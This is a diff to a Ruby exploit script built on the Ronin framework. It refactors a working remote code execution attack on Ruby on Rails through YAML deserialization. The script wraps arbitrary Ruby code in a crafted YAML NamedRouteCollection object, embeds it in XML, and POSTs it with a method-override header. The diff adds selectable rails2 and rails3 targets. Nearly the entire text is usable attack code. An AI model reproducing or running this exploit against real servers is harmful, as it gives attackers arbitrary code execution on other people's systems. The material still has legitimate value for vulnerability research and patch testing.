@@ -75,59 +75,71 @@ require 'yaml'
 include Ronin::Network::HTTP
 include Ronin::UI::Output::Helpers
 
-unless ARGV.length == 2
-  $stderr.puts "usage: #{$0} URL RUBY"
-  exit -1
+def escape_payload(payload,target=:rails3)
+  case target
+  when :rails3 then "foo\n#{payload}\n__END__\n"
+  when :rails2 then "foo\nend\n#{payload}\n__END__\n"
+  else
+    raise(ArgumentError,"unsupported target: #{target}")
+  end
 end
 
-url   = ARGV[0]
-code  = ARGV[1]
-
-escaped_code = %{foo
-unless @executed
-  #{code}
-  @executed = true
+def wrap_payload(payload)
+  "(#{payload}; @executed = true) unless @executed"
 end
-__END__
-}
 
-yaml = %{
---- !ruby/hash:ActionDispatch::Routing::RouteSet::NamedRouteCollection
-? #{escaped_code.to_yaml.sub('--- ','').chomp}
-: !ruby/object:OpenStruct
-  table:
-    :defaults:
-      :action: create
-      :controller: foos
-    :required_parts: []
-    :requirements:
-      :action: create
-      :controller: foos
-    :segment_keys:
+def exploit(url,payload,target=:rails3)
+  escaped_payload = escape_payload(wrap_payload(payload),target)
+  encoded_payload = escaped_payload.to_yaml.sub('--- ','').chomp
+
+  yaml = %{
+--- !ruby/hash:ActionController::Routing::RouteSet::NamedRouteCollection
+? #{encoded_payload}
+: !ruby/struct
+  defaults:
+    :action: create
+    :controller: foos
+  required_parts: []
+  requirements:
+    :action: create
+    :controller: foos
+  segment_keys:
     - :format
-  modifiable: true
-}.strip
+  }.strip
 
-xml = %{
+  xml = %{
 <?xml version="1.0" encoding="UTF-8"?>
 <exploit type="yaml">#{yaml.html_escape}</exploit>
-}.strip
+  }.strip
 
-print_info "POSTing #{code} to #{url} ..."
+  response = http_post(
+    :url       => url,
+    :headers   => {
+      :content_type           => 'text/xml',
+      :x_http_method_override => 'get'
+    },
+    :body      => xml
+  )
 
-response = http_post(
-  :url       => url,
-  :headers   => {
-    :content_type           => 'text/xml',
-    :x_http_method_override => 'get'
-  },
-  :body      => xml
-)
+  return response
+end
 
-print_debug "Received #{response.code} response"
+if $0 == __FILE__
+  unless ARGV.length == 3
+    $stderr.puts "usage: #{$0} URL [rails2|rails3] RUBY"
+    exit -1
+  end
 
-case response.code
-when '200' then print_info  "Success!"
-when '404' then print_error "Not found"
-when '500' then print_error "Error!"
+  url     = ARGV[0]
+  target  = ARGV[1].to_sym
+  payload = ARGV[2]
+
+  print_info "POSTing #{payload} to #{url} ..."
+  response = exploit(url,payload,target)
+
+  case response.code
+  when '200' then print_info "Success!"
+  when '500' then print_error "Error!"
+  else            print_error "Received response code #{response.code}"
+  end
 end
